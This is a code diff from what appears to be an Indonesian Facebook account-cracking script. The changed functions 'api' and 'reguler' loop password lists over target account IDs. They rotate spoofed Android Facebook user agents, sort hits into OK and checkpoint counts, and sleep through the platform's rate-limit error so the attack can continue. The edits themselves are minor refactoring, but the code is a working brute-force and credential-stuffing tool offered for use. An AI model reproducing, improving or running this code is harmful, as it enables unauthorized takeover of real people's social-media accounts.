@@ -1102,7 +1102,7 @@ def passwrd():
                     for xpwd in pwnya:
                         pwv.append(xpwd)
                 else:pass
-                pool.submit(reguler,idf,pwv,awal)
+                pool.submit(reguler,idf,pwv)
                 
         print('')
     Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
@@ -1119,11 +1119,9 @@ def passwrd():
 
 #--------------------[ METODE-MOBILE ]-----------------#
     
-def api(idf,pwv,awal):
+def api(idf,pwv):
     global loop,ok,cp
     rr = random.randint
-    Rudal = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
-    ahir = str(datetime.now()-awal).split('.')[0]
     prog.update(des,description=f"{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
     rudalll = [f'Mozilla/5.0 (Linux; Android {str(rr(1,14))}; SM-G780G Build/SP1A.210812.016; wv)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(77,150))}.0{str(rr(4000,4280))}.{str(rr(70,199))} Mobile Safari/537.36[FB_IAB/FB4A; FBAV/397.0.0.23.404;']
@@ -1189,19 +1187,16 @@ def api(idf,pwv,awal):
             elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
                 prog.update(des,description=f" {H2}•{P2} crack {M2}spam{P2} {str(loop)}/{len(id)} OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}")
                 prog.advance(des)
-                time.sleep(31)
+                time.sleep(30)
             else:continue
     except requests.exceptions.ConnectionError:time.sleep(31)
 loop+=1
 #--------------------[ METODE reguler ]-----------------#
-def reguler(idf,pwv,awal):
+def reguler(idf,pwv):
 	global loop,ok,cp
 	rr = random.randint
-	Rudal = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
-	ahir = str(datetime.now()-awal).split('.')[0]
 	prog.update(des,description=f"{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
-	rudalll = [f'Mozilla/5.0 (Linux; Android {str(rr(1,14))}; SM-G780G Build/SP1A.210812.016; wv)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(77,150))}.0{str(rr(4000,4280))}.{str(rr(70,199))} Mobile Safari/537.36[FB_IAB/FB4A; FBAV/397.0.0.23.404;']
 	ua = random.choice(free)
 	ses = requests.Session()
 	for pw in pwv:
